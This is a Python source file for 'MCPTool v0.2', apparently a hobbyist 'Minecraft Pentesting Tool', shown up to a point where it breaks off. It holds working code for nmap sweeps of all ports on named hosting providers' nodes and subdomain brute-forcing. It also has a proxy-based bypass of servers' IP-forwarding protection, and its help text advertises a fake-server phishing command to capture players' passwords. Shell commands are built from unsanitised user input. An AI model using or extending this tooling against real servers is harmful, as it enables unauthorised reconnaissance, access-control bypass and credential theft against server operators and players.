import os
import time
import platform
import requests
import json
import re
import socket

from random import randint
from datetime import datetime
from colorama import Fore, init

# MCPTool v0.2

# Herramienta de Pentesting para Minecraft

# Hecho por wRRulos

# @wrrulos

init ()

os.system("title MCPTool v0.2")

# Variables

so = platform.system()

rojo = Fore.RED
lrojo = Fore.LIGHTRED_EX
negro = Fore.BLACK
lnegro = Fore.LIGHTBLACK_EX
blanco = Fore.WHITE
verde = Fore.GREEN
lverde = Fore.LIGHTGREEN_EX
lcyan = Fore.LIGHTCYAN_EX
lmagenta = Fore.LIGHTMAGENTA_EX
reset = Fore.RESET

urlmcsrv = "https://api.mcsrvstat.us/2/"
urlmojang = "https://api.mojang.com/users/profiles/minecraft/"
discord = ""


def cmd_clear():
    if so == "Windows":
        os.system("cls")

# Detectar idioma

if os.path.isdir("datos"):
    if os.path.isfile("datos/idioma"):
        archivo_idioma = open("datos/idioma", "r")
        idioma = archivo_idioma.read()
        archivo_idioma.close()

        if idioma == "es" or idioma == "en":
            print("")

        else:
            print("")
            print(lnegro + "    [" + rojo + "-" + lnegro + "]" + lrojo + " Se ha detectado un idioma desconocido. ")

            time.sleep(2)

            print("")
            print(lrojo + "    MCPTool se ejecutara en su idioma predeterminado (Español).")

            archivo_idioma = open("datos/idioma", "w+")
            archivo_idioma.truncate(0)
            archivo_idioma.write("es")
            archivo_idioma.close()

            archivo_idioma = open("datos/idioma", "r")
            idioma = archivo_idioma.read()
            archivo_idioma.close()

            time.sleep(2)
            
    else:
        print("")
        print(lnegro + "    [" + rojo + "-" + lnegro + "]" + lrojo + " No se encontro la configuracion del idioma.")

        time.sleep(2)

        print("")
        print(lrojo + "    MCPTool se ejecutara en su idioma predeterminado (Español).")

        archivo_idioma = open("datos/idioma", "w")
        archivo_idioma.write("es")
        archivo_idioma.close()

        archivo_idioma = open("datos/idioma", "r")
        idioma = archivo_idioma.read()
        archivo_idioma.close()

        time.sleep(2)

else:
    print("")
    print(lnegro + "    [" + rojo + "-" + lnegro + "]" + lrojo + " No se encontro la carpeta datos.")

    time.sleep(2)

    print("")
    print(lrojo + "    MCPTool se ejecutara en su idioma predeterminado (Español).")

    os.mkdir("datos")

    archivo_idioma = open("datos/idioma", "w")
    archivo_idioma.write("es")
    archivo_idioma.close()

    archivo_idioma = open("datos/idioma", "r")
    idioma = archivo_idioma.read()
    archivo_idioma.close()

    time.sleep(2)


# Verificar nmap

nmap = os.system("nmap -version >nul")

if str(nmap) == "0":
    print(" ")

else:
    cmd_clear()
    print("")
    print(lrojo + "    No está instalado Nmap. Por favor instalalo y vuelva a ejecutar MCPTool.")
    time.sleep(4)
    exit()

# Banners

def banner():
    print("\n\n")
    print(rojo + "    ███╗   ███╗ ██████╗██████╗     ████████╗ ██████╗  ██████╗ ██╗     " + lrojo + "    Telegram: " + blanco + "wrrulos")
    print(rojo + "    ████╗ ████║██╔════╝██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     " + lrojo + "    Discord: " + blanco + "Rulo#9224")
    print(rojo + "    ██╔████╔██║██║     ██████╔╝       ██║   ██║   ██║██║   ██║██║     " + lrojo + "    Github: " + blanco + "@wrrulos")
    print(blanco + "    ██║╚██╔╝██║██║     ██╔═══╝        ██║   ██║   ██║██║   ██║██║     " )
    print(blanco + "    ██║ ╚═╝ ██║╚██████╗██║            ██║   ╚██████╔╝╚██████╔╝███████╗" + lrojo + "    Minecraft Pentesting Tool " + lverde + "v0.2")
    print(blanco + "    ╚═╝     ╚═╝ ╚═════╝╚═╝            ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝" )
    print("\n")

# Comando help

def cmd_help_es():
    print("")
    print("    ╔════════════════════════════════════════════════════════════════════════════════╗")
    print("    ║         Comando            ║                 Funcion                           ║")
    print("    ║                            ║                                                   ║")
    print("    ║════════════════════════════════════════════════════════════════════════════════║")
    print("    ║ get-serverinfo [ip]        ║ Muestra informacion de un servidor.               ║")
    print("    ║ get-playerinfo [name]      ║ Muestra informacion de un jugador.                ║")
    print("    ║ scan-ports [ip] [ports]    ║ Escanea los puertos de un servidor.               ║")
    print("    ║ scan-host [host]           ║ Escanea los nodos de un host.                     ║")
    print("    ║ scan-subd  [ip]            ║ Escanea los subdominios de un servidor.           ║")
    print("    ║ bypass-ipf [ip:port]       ║ Burla la pantalla de IP Forwarding.               ║")
    print("    ║ phishing [server]          ║ Crea un servidor falso para capturar contraseñas. ║")
    print("    ║                            ║                                                   ║")
    print("    ║                            ║                                                   ║")
    print("    ║ clear                      ║ Limpia la pantalla.                               ║")
    print("    ║ set-language [language]    ║ Cambia el idioma de MCPTool.                      ║")
    print("    ╚════════════════════════════════════════════════════════════════════════════════╝") 

def cmd_help_en():
    print("")
    print("    ╔══════════════════════════════════════════════════════════════════════════╗")
    print("    ║         Command            ║                Function                     ║")
    print("    ║                            ║                                             ║")
    print("    ║══════════════════════════════════════════════════════════════════════════║")
    print("    ║ get-serverinfo [ip]        ║ Displays information about a server.        ║")
    print("    ║ get-playerinfo [name]      ║ Displays information about a player.        ║")
    print("    ║ scan-ports [ip] [ports]    ║ Scan the ports of a server.                 ║")
    print("    ║ scan-host [host]           ║ Scans the nodes of a host.                  ║")
    print("    ║ scan-subd  [ip]            ║ Scans the subdomains of a server.           ║")
    print("    ║ bypass-ipf [ip:port]       ║ Bypass IP Forwarding screen.                ║")
    print("    ║ phishing [server]          ║ Create a fake server to capture passwords.  ║")
    print("    ║                            ║                                             ║")
    print("    ║                            ║                                             ║")
    print("    ║ clear                      ║ Clean the screen.                           ║")
    print("    ║ set-language [language]    ║ Change the language of MCPTool.             ║")
    print("    ╚══════════════════════════════════════════════════════════════════════════╝")

def carpeta_escaneos():
    if os.path.isdir("escaneos"):
        pass

    else:
        os.mkdir("escaneos")

def menu():
    cmd_clear()
    banner()
    while True:
        print("")
        print(rojo + "    MCPTool " + lnegro + "» " + blanco + "" + "", end="")
        argumento = input().split()
        try:
            comando = argumento[0].lower()

            if comando == "help":
                if idioma == "es":
                    cmd_help_es()

                elif idioma == "en":
                    cmd_help_en()

            elif comando == "clear":
                cmd_clear()
                banner()
            
            elif comando == "get-serverinfo":
                try:
                    servidor = argumento[1]
                    try:
                        respuesta = requests.get(urlmcsrv + servidor)
                        respuesta_json = respuesta.json()
                        try:
                            ip = respuesta_json["ip"]
                            puerto = respuesta_json["port"]
                            clean = respuesta_json["motd"]["clean"]
                            jugadores_online = respuesta_json["players"]["online"]
                            jugadores_maximo = respuesta_json["players"]["max"]
                            version = respuesta_json["version"]

                            if idioma == "es":
                                print("")
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " IP Númerica: " + lverde + str(ip))
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " Puerto: " + lverde + str(puerto))
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " Versión: " + lverde + str(version))
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " Jugadores: " + lverde + str(jugadores_online) + lnegro + "/" + verde + str(jugadores_maximo))
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " MOTD: " + lverde + str(clean))

                            elif idioma == "en":
                                print("")
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " IP: " + lverde + str(ip))
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " Port: " + lverde + str(puerto))
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " Versión: " + lverde + str(version))
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " Players: " + lverde + str(jugadores_online) + lnegro + "/" + verde + str(jugadores_maximo))
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " MOTD: " + lverde + str(clean))

                        except:
                            if idioma == "es":
                                print("")
                                print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " El servidor no existe.")

                            elif idioma == "en":
                                print("")
                                print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " The server does not exist.")

                    except:
                        if idioma == "es":
                            print("")
                            print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " Error de conexión.")

                        elif idioma == "en":
                            print("")
                            print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " Connection error.")

                except:
                    if idioma == "es":
                        print("")
                        print(blanco + "    Usa: get-serverinfo [ip] o [ip:port]")

                    elif idioma == "en":
                        print("")
                        print(blanco + "    Usage: get-serverinfo [ip] or [ip:port]")

            elif comando == "get-playerinfo":
                try:
                    jugador = argumento[1]

                    try:
                        prueba = requests.get(urlmojang)
                        try:
                            respuesta = requests.get(urlmojang + jugador)
                            respuesta_json = respuesta.json()

                            nombre = respuesta_json["name"]
                            uuid =  respuesta_json["id"]
                            
                            print("")

                            if idioma == "es":
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " Nombre: " + lverde + str(nombre))
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " UUID: " + lverde + str(uuid))

                            elif idioma == "en":
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " Name: " + lverde + str(nombre))
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " UUID: " + lverde + str(uuid))           

                        except:
                            print("")

                            if idioma == "es":
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " Nombre: " + verde + str(jugador))
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " UUID: " + lrojo + "Ninguna")

                            elif idioma == "en":
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " Name: " + verde + str(jugador))
                                print(blanco + "    [" + verde + "+" + blanco + "]" + blanco + " UUID: " + lrojo + "None") 

                    except:
                        if idioma == "es":
                            print("")
                            print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " Error de conexión.")

                        elif idioma == "en":
                            print("")
                            print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " Connection error.")

                except:
                    if idioma == "es":
                        print("")
                        print(blanco + "    Usa: get-playerinfo [jugador]")

                    elif idioma == "en":
                        print("")
                        print(blanco + "    Usage: get-playerinfo [player]")

            elif comando == "scan-ports":
                try:
                    ip = argumento[1]
                    puertos = argumento[2]
                    try:
                        prueba = requests.get(urlmojang)
                        try:
                            os.system("nmap -p " + puertos + " -T4 -v -oN temp.txt " + ip + " >nul")
                            print("")
                            try:
                                archivo_temp = open("temp.txt", "r")
                                resultado_temp = archivo_temp.read()

                                resultados = resultado_temp.split('Nmap scan report for ')

                                for resultado in resultados:
                                    puertos = re.findall(r'([0-9]+)/tcp', resultado)

                                    for puerto in puertos:
                                        try:
                                            sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
                                            sckt.settimeout(2);
                                            sckt.connect((ip, int(puerto)));
                                            sckt.send(b"\xfe\x01");
                                            datos = sckt.recv(1024)[3:].decode("utf-16be")[3:].split("\x00")
                                            sckt.close()

                                            version = re.sub(r'§[a-zA-Z0-9]', '', datos[1].strip().replace('  ', '').replace('  ', ''))
                                            motd = re.sub(r'§[a-zA-Z0-9]', '', datos[2].strip().replace('  ', '').replace('  ', ''))
                                            jugadores = re.sub(r'§[a-zA-Z0-9]', '', f'{datos[3]}/{datos[4]}'.strip().replace('  ', '').replace('  ', ''))

                                            if idioma == "es":
                                                print(blanco + "    [" + lverde + "√" + blanco + "] " + verde + "Servidor encontrado:")
                                                print("")
                                                print(blanco + "        IP: " + lcyan + ip + ":" + puerto)
                                                print(blanco + "        MOTD: " + lcyan + motd)
                                                print(blanco + "        Versión: " + lcyan + version)
                                                print(blanco + "        Jugadores: " + lcyan + jugadores)
                                                print("")

                                            elif idioma == "en":                        
                                                print(blanco + "    [" + lverde + "√" + blanco + "] " + verde + "Server found:")
                                                print("")
                                                print(blanco + "        IP: " + lcyan + ip + ":" + puerto)
                                                print(blanco + "        MOTD: " + lcyan + motd)
                                                print(blanco + "        Versión: " + lcyan + version)
                                                print(blanco + "        Players: " + lcyan + jugadores)
                                                print("")

                                        except socket.timeout:
                                            if idioma == "es":
                                                print(blanco + "    [" + lrojo + "-" + blanco + "] " + verde + "Servidor encontrado " + rojo + "(tiempo agotado)" + verde + ":")
                                                print("")
                                                print(blanco + "        IP: " + lcyan + ip + ":" + puerto)
                                                print("")

                                            elif idioma == "en":                        
                                                print(blanco + "    [" + lrojo + "-" + blanco + "] " + verde + "Servidor found: " + rojo + "(time out)" + verde + ":")
                                                print("")
                                                print(blanco + "        IP: " + lcyan + ip + ":" + puerto)
                                                print("")

                                        except:
                                            pass

                            except:
                                print("")

                        except:
                            print("")

                    except:
                        if idioma == "es":
                            print("")
                            print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " Error de conexión.")

                        elif idioma == "en":
                            print("")
                            print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " Connection error.")

                except:
                    if idioma == "es":
                        print("")
                        print(blanco + "    Usa: scan-ports [ip] [puertos]")

                    elif idioma == "en":
                        print("")
                        print(blanco + "    Usage: scan-ports [ip] [ports]")

            elif comando == "scan-subd":
                try:
                    ip = argumento[1]
                    try:
                        subdominios = ("node1", "node2", "node3", "node 4", "node5", "node6", "node7", "node8", "node9", "node10", "node11", "node12", "node13", "node14", "node15", "node16", "node17", "node18", "node19", "node20", "node001", "node002", "node01", "node02", "node003", "sys001", "sys002", "go", "admin", "eggwars", "bedwars", "lobby1", "hub", "builder", "developer", "test", "test1", "forum", "bans", "baneos", "ts", "ts3", "sys1", "sys2", "mods", "bungee", "bungeecord", "array", "spawn", "server", "help", "client", "api", "smtp", "s1", "s2", "s3", "s4", "server1", "server2", "jugar", "login", "mysql", "phpmyadmin", "demo", "na", "eu", "us", "es", "fr", "it", "ru", "support", "developing", "discord", "backup", "buy", "buycraft", "go", "dedicado1", "dedi", "dedi1", "dedi2", "dedi3", "minecraft", "prueba", "pruebas", "ping", "register", "cdn", "stats", "store", "serie", "buildteam", "info", "host", "jogar", "proxy", "vps", "ovh", "partner", "partners", "appeals", "appeal", "store-assets", "builds", "testing", "server", "pvp", "skywars", "survival", "skyblock", "lobby", "hg", "games", "sys001", "sys002", "node001", "node002", "games001", "games002", "us72", "us1", "us2", "us3", "us4", "us5", "goliathdev", "staticassets", "rewards", "rpsrv", "ftp", "ssh", "web", "jobs", "render", "www", "build", "web", "dev", "staff", "mc", "play", "sys", "live")
                        red = requests.get(urlmojang)
                        print("")

                        for subdominio in subdominios:
                            try:
                                server_ip = str(subdominio) + "."+str(ip)
                                host_ip = socket.gethostbyname(str(server_ip))

                                if idioma == "es":
                                    print (blanco + "    [" + lverde + "√" + blanco + "]" + blanco + " Subdominio encontrado " + lnegro + "» " + verde + "" + str(subdominio) + "." + str(ip))

                                elif idioma == "en":
                                    print (blanco + "    [" + lverde + "√" + blanco + "]" + blanco + " Subdomain found " + lnegro + "» " + verde + "" + str(subdominio) + "." + str(ip))

                            except:
                                pass

                    except:
                        if idioma == "es":
                            print("")
                            print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " Error de conexión.")

                        elif idioma == "en":
                            print("")
                            print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " Connection error.")

                except:
                    if idioma == "es":
                        print("")
                        print(blanco + "    Usa: scan-subd [ip]")

                    elif idioma == "en":
                        print("")
                        print(blanco + "    Usage: scan-subd [ip]")

            elif comando == "bypass-ipf":
                try:
                    ip = argumento[1]
                    try:
                        print("")

                        if idioma == "es":
                            print(blanco + "    [" + verde + "+" + blanco + "] " + lverde + "Iniciando proxy...")

                        elif idioma == "en":
                            print(blanco + "    [" + verde + "+" + blanco + "] " + lverde + "Starting proxy...")

                        archivo_config = open("bungee/config.txt", "r")
                        config_yml = archivo_config.read()
                        archivo_config.close()

                        archivo_config = open("bungee/config.yml", "w+")
                        archivo_config.truncate(0)
                        archivo_config.write(config_yml)
                        archivo_config.write("    address: " + str(ip) + "\n")
                        archivo_config.write("    restricted: false")
                        archivo_config.close()

                        os.system("cd bungee & start start.bat")

                        time.sleep(10)

                        print("")
                        print(blanco + "    [" + verde + "√" + blanco + "]" + blanco + " IP: " + lverde + "0.0.0.0:25567")

                    except:
                        print("")
                        print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " Error.")

                except:
                    if idioma == "es":
                        print("")
                        print(blanco + "    Usa: bypass-ipf [ip]")

                    elif idioma == "en":
                        print("")
                        print(blanco + "    Usage: bypass-ipf [ip]")

            elif comando == "scan-host":
                try:
                    host = argumento[1]

                    try:
                        if host == "minehost":
                            try:
                                nodos = ("sv10", "sv11", "sv12", "sv13", "sv14", "sv15", "sv16", "sv17", "sv18")
                                #nodos = ("pro", "sv1", "sv2", "sv3", "sv4", "sv5", "sv6", "sv7", "sv8", "sv9", "sv10", "sv11", "sv12", "sv13", "sv14", "sv15", "sv16", "sv17", "sv18", "sv19", "sv20")
                                dominio = ".minehost.com.ar"
                                puertos_minehost = "0-65535"

                                red = requests.get(urlmojang)

                                print("")

                                try:
                                    carpeta_escaneos()

                                    if os.path.isdir("escaneos/minehost"):
                                        pass

                                    else:
                                        os.mkdir("escaneos/minehost")

                                    lista_nodos = open("nodos_minehost_temp.txt", "w+")

                                    fecha = datetime.now()

                                    archivo_escaneo_minehost = open("escaneos/minehost/Minehost" + "_" + str(fecha.day) + "-" + str(fecha.month) + "-" + str(fecha.year) + "_" + str(fecha.hour) + "." + str(fecha.minute) + "." + str(fecha.second) + ".txt", "w")
                                    archivo_escaneo_minehost.write("MCPTool @wrrulos \n\n")

                                    if idioma == "es":

                                        archivo_escaneo_minehost.write("Escaneo de Minehost \n\n")
                                        archivo_escaneo_minehost.write("Información: \n\n")
                                        archivo_escaneo_minehost.write("    Fecha: " + str(fecha.day) + "-" + str(fecha.month) + "-" + str(fecha.year) + "\n")
                                        archivo_escaneo_minehost.write("    Hora: " + str(fecha.hour) + "." + str(fecha.minute) + "." + str(fecha.second) + "\n\n")
                                        archivo_escaneo_minehost.write("Nodos encontrados: \n\n")

                                    elif idioma == "en":

                                        archivo_escaneo_minehost.write("Minehost scan \n\n")
                                        archivo_escaneo_minehost.write("Information: \n\n")
                                        archivo_escaneo_minehost.write("    Date: " + str(fecha.day) + "-" + str(fecha.month) + "-" + str(fecha.year) + "\n")
                                        archivo_escaneo_minehost.write("    Hour: " + str(fecha.hour) + "." + str(fecha.minute) + "." + str(fecha.second) + "\n\n")
                                        archivo_escaneo_minehost.write("Found nodes: \n\n")

                                    lista_nodos.truncate(0)

                                    for nodo in nodos:

                                        try:
                                            ip = socket.gethostbyname(str(nodo) + str(dominio))

                                            lista_nodos.write("\n")
                                            lista_nodos.write(str(ip) + "\n")
                                            archivo_escaneo_minehost.write("Nodo: " + str(nodo) + str(dominio) + "    IP: " + str(ip) + "\n")

                                        except:
                                            pass

                                    lista_nodos.close()

                                    archivo_escaneo_minehost.write("\n")

                                    lista_ip = open("nodos_minehost_temp.txt", "r")

                                    for linea in lista_ip:

                                        ip = lista_ip.readline()

                                        ip = ip.replace("\n", "")

                                        os.system("nmap -p " + puertos_minehost + " -T4 -v -oN minehost_temp.txt " + ip + " >nul")

                                        print("")

                                        escaneo_minehost = open("minehost_temp.txt", "r", encoding="utf8") 

                                        resultado_minehost = escaneo_minehost.read()

                                        resultados = resultado_minehost.split('Nmap scan report for ')
 
                                        for resultado in resultados:
                                            puertos = re.findall(r'([0-9]+)/tcp', resultado)

                                            for puerto in puertos:
                                                try:
                                                    sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
                                                    sckt.settimeout(2);
                                                    sckt.connect((ip, int(puerto)));
                                                    sckt.send(b"\xfe\x01");
                                                    datos = sckt.recv(1024)[3:].decode("utf-16be")[3:].split("\x00")
                                                    sckt.close()

                                                    version = re.sub(r'§[a-zA-Z0-9]', '', datos[1].strip().replace('  ', '').replace('  ', ''))
                                                    motd = re.sub(r'§[a-zA-Z0-9]', '', datos[2].strip().replace('  ', '').replace('  ', ''))
                                                    jugadores = re.sub(r'§[a-zA-Z0-9]', '', f'{datos[3]}/{datos[4]}'.strip().replace('  ', '').replace('  ', ''))

                                                    if idioma == "es":
                                                        print(blanco + "    [" + lverde + "√" + blanco + "] " + verde + "Servidor encontrado:")
                                                        print("")
                                                        print(blanco + "        IP: " + lcyan + ip + ":" + puerto)
                                                        print(blanco + "        MOTD: " + lcyan + motd)
                                                        print(blanco + "        Versión: " + lcyan + version)
                                                        print(blanco + "        Jugadores: " + lcyan + jugadores)
                                                        print("")
                                                        archivo_escaneo_minehost.write("[+] Servidor encontrado: \n\n")
                                                        archivo_escaneo_minehost.write("    IP: " + str(ip) + ":" + str(puerto) + "\n")
                                                        archivo_escaneo_minehost.write("    MOTD: " + str(motd) + "\n")
                                                        archivo_escaneo_minehost.write("    Versión: " + str(version) + "\n")
                                                        archivo_escaneo_minehost.write("    Jugadores: " + str(jugadores) + "\n\n")


                                                    elif idioma == "en":
                                                        print(blanco + "    [" + lverde + "√" + blanco + "] " + verde + "Server found:")
                                                        print("")
                                                        print(blanco + "        IP: " + lcyan + ip + ":" + puerto)
                                                        print(blanco + "        MOTD: " + lcyan + motd)
                                                        print(blanco + "        Versión: " + lcyan + version)
                                                        print(blanco + "        Players: " + lcyan + jugadores)
                                                        print("")
                                                        archivo_escaneo_minehost.write("[+] Server found: \n\n")
                                                        archivo_escaneo_minehost.write("    IP: " + str(ip) + ":" + str(puerto) + "\n")
                                                        archivo_escaneo_minehost.write("    MOTD: " + str(motd) + "\n")
                                                        archivo_escaneo_minehost.write("    Versión: " + str(version) + "\n")
                                                        archivo_escaneo_minehost.write("    Players: " + str(jugadores) + "\n\n")

                                                except socket.timeout:
                                                    if idioma == "es":
                                                        print(blanco + "    [" + lrojo + "-" + blanco + "] " + verde + "Servidor encontrado " + rojo + "(tiempo agotado)" + verde + ":")
                                                        print("")
                                                        print(blanco + "        IP: " + lcyan + ip + ":" + puerto)
                                                        print("")
                                                        archivo_escaneo_minehost.write("[-] Servidor encontrado (Apagado)     IP: " + str(ip) +  ":" + str(puerto) + "\n\n")

                                                    elif idioma == "en":
                                                        print(blanco + "    [" + lrojo + "-" + blanco + "] " + verde + "Servidor found: " + rojo + "(time out)" + verde + ":")
                                                        print("")
                                                        print(blanco + "        IP: " + lcyan + ip + ":" + puerto)
                                                        print("")
                                                        archivo_escaneo_minehost.write("[-] Server found (Offline)     IP: " + str(ip) +  ":" + str(puerto) + "\n\n")

                                                except:
                                                    pass

                                        escaneo_minehost.close()
                                    
                                    if idioma == "es":
                                        print(blanco + "   Los datos del escaneo se guardaron en escaneos/minehost/Minehost" + "_" + str(fecha.day) + "-" + str(fecha.month) + "-" + str(fecha.year) + "_" + str(fecha.hour) + "." + str(fecha.minute) + "." + str(fecha.second) + ".txt")

                                    elif idioma == "en":
                                        print(blanco + "   The scan data was saved in escaneos/minehost/Minehost" + "_" + str(fecha.day) + "-" + str(fecha.month) + "-" + str(fecha.year) + "_" + str(fecha.hour) + "." + str(fecha.minute) + "." + str(fecha.second) + ".txt")
                                    
                                    archivo_escaneo_minehost.close()
                                    lista_ip.close()
                                    os.remove("nodos_minehost_temp.txt")
                                    os.remove("minehost_temp.txt")

                                except:
                                    print("Error desconocido.")

                            except:
                                if idioma == "es":
                                    print("")
                                    print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " Error de conexión.")

                                elif idioma == "en":
                                    print("")
                                    print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " Connection error.")

                        if host == "vyxterhost":
                            try:
                                nodos = ("free1", "free2", "usapay1", "usapay2", "usapay3", "usapay4", "usapay5", "usapay6" "usa1" , "usa2", "usa3", "usa4", "usa5", "usa6", "usa7", "usa8", "usa9", "usa10", "usa11", "usa12", "usa13", "usa14", "usa15", "usa16", "usa17", "usa18", "usa19", "usa20", "usa21", "usa22", "usa23", "usa24", "usa25", "usa26", "usa27", "usa28", "usa29", "usa30", "usa31", "usa32", "usa33", "usa34", "usa35")
                                dominio = ".vyxterhost.com"
                                puertos_vyxter = "0-65535"

                                red = requests.get(urlmojang)

                                print("")

                                try:
                                    carpeta_escaneos()

                                    if os.path.isdir("escaneos/vyxterhost"):
                                        pass

                                    else:
                                        os.mkdir("escaneos/vyxterhost")

                                    lista_nodos = open("nodos_vyxter_temp.txt", "w+")

                                    fecha = datetime.now()

                                    archivo_escaneo_vyxter = open("escaneos/vyxterhost/Vyxterhost" + "_" + str(fecha.day) + "-" + str(fecha.month) + "-" + str(fecha.year) + "_" + str(fecha.hour) + "." + str(fecha.minute) + "." + str(fecha.second) + ".txt", "w")
                                    archivo_escaneo_vyxter.write("MCPTool @wrrulos \n\n")

                                    if idioma == "es":

                                        archivo_escaneo_vyxter.write("Escaneo de Vyxterhost \n\n")
                                        archivo_escaneo_vyxter.write("Información: \n\n")
                                        archivo_escaneo_vyxter.write("    Fecha: " + str(fecha.day) + "-" + str(fecha.month) + "-" + str(fecha.year) + "\n")
                                        archivo_escaneo_vyxter.write("    Hora: " + str(fecha.hour) + "." + str(fecha.minute) + "." + str(fecha.second) + "\n\n")
                                        archivo_escaneo_vyxter.write("Nodos encontrados: \n\n")

                                    elif idioma == "en":

                                        archivo_escaneo_vyxter.write("Vyxterhost scan \n\n")
                                        archivo_escaneo_vyxter.write("Information: \n\n")
                                        archivo_escaneo_vyxter.write("    Date: " + str(fecha.day) + "-" + str(fecha.month) + "-" + str(fecha.year) + "\n")
                                        archivo_escaneo_vyxter.write("    Hour: " + str(fecha.hour) + "." + str(fecha.minute) + "." + str(fecha.second) + "\n\n")
                                        archivo_escaneo_vyxter.write("Found nodes: \n\n")

                                    lista_nodos.truncate(0)

                                    for nodo in nodos:

                                        try:
                                            ip = socket.gethostbyname(str(nodo) + str(dominio))

                                            lista_nodos.write("\n")
                                            lista_nodos.write(str(ip) + "\n")
                                            archivo_escaneo_vyxter.write("Nodo: " + str(nodo) + str(dominio) + "    IP: " + str(ip) + "\n")

                                        except:
                                            pass

                                    lista_nodos.close()

                                    archivo_escaneo_vyxter.write("\n")

                                    lista_ip = open("nodos_vyxter_temp.txt", "r")

                                    for linea in lista_ip:

                                        ip = lista_ip.readline()

                                        ip = ip.replace("\n", "")

                                        os.system("nmap -p " + puertos_vyxter + " -T4 -v -oN vyxter_temp.txt " + ip + " >nul")

                                        print("")

                                        escaneo_vyxter = open("vyxter_temp.txt", "r", encoding="utf8") 

                                        resultado_vyxter = escaneo_vyxter.read()

                                        resultados = resultado_vyxter.split('Nmap scan report for ')
 
                                        for resultado in resultados:
                                            puertos = re.findall(r'([0-9]+)/tcp', resultado)

                                            for puerto in puertos:
                                                try:
                                                    sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
                                                    sckt.settimeout(2);
                                                    sckt.connect((ip, int(puerto)));
                                                    sckt.send(b"\xfe\x01");
                                                    datos = sckt.recv(1024)[3:].decode("utf-16be")[3:].split("\x00")
                                                    sckt.close()

                                                    version = re.sub(r'§[a-zA-Z0-9]', '', datos[1].strip().replace('  ', '').replace('  ', ''))
                                                    motd = re.sub(r'§[a-zA-Z0-9]', '', datos[2].strip().replace('  ', '').replace('  ', ''))
                                                    jugadores = re.sub(r'§[a-zA-Z0-9]', '', f'{datos[3]}/{datos[4]}'.strip().replace('  ', '').replace('  ', ''))

                                                    if idioma == "es":
                                                        print(blanco + "    [" + lverde + "√" + blanco + "] " + verde + "Servidor encontrado:")
                                                        print("")
                                                        print(blanco + "        IP: " + lcyan + ip + ":" + puerto)
                                                        print(blanco + "        MOTD: " + lcyan + motd)
                                                        print(blanco + "        Versión: " + lcyan + version)
                                                        print(blanco + "        Jugadores: " + lcyan + jugadores)
                                                        print("")
                                                        archivo_escaneo_vyxter.write("[+] Servidor encontrado: \n\n")
                                                        archivo_escaneo_vyxter.write("    IP: " + str(ip) + ":" + str(puerto) + "\n")
                                                        archivo_escaneo_vyxter.write("    MOTD: " + str(motd) + "\n")
                                                        archivo_escaneo_vyxter.write("    Versión: " + str(version) + "\n")
                                                        archivo_escaneo_vyxter.write("    Jugadores: " + str(jugadores) + "\n\n")


                                                    elif idioma == "en":
                                                        print(blanco + "    [" + lverde + "√" + blanco + "] " + verde + "Server found:")
                                                        print("")
                                                        print(blanco + "        IP: " + lcyan + ip + ":" + puerto)
                                                        print(blanco + "        MOTD: " + lcyan + motd)
                                                        print(blanco + "        Versión: " + lcyan + version)
                                                        print(blanco + "        Players: " + lcyan + jugadores)
                                                        print("")
                                                        archivo_escaneo_vyxter.write("[+] Server found: \n\n")
                                                        archivo_escaneo_vyxter.write("    IP: " + str(ip) + ":" + str(puerto) + "\n")
                                                        archivo_escaneo_vyxter.write("    MOTD: " + str(motd) + "\n")
                                                        archivo_escaneo_vyxter.write("    Versión: " + str(version) + "\n")
                                                        archivo_escaneo_vyxter.write("    Players: " + str(jugadores) + "\n\n")

                                                except socket.timeout:
                                                    if idioma == "es":
                                                        print(blanco + "    [" + lrojo + "-" + blanco + "] " + verde + "Servidor encontrado " + rojo + "(tiempo agotado)" + verde + ":")
                                                        print("")
                                                        print(blanco + "        IP: " + lcyan + ip + ":" + puerto)
                                                        print("")
                                                        archivo_escaneo_vyxter.write("[-] Servidor encontrado (Apagado)     IP: " + str(ip) +  ":" + str(puerto) + "\n\n")

                                                    elif idioma == "en":
                                                        print(blanco + "    [" + lrojo + "-" + blanco + "] " + verde + "Servidor found: " + rojo + "(time out)" + verde + ":")
                                                        print("")
                                                        print(blanco + "        IP: " + lcyan + ip + ":" + puerto)
                                                        print("")
                                                        archivo_escaneo_vyxter.write("[-] Server found (Offline)     IP: " + str(ip) +  ":" + str(puerto) + "\n\n")

                                                except:
                                                    pass

                                        escaneo_vyxter.close()
                                    
                                    if idioma == "es":
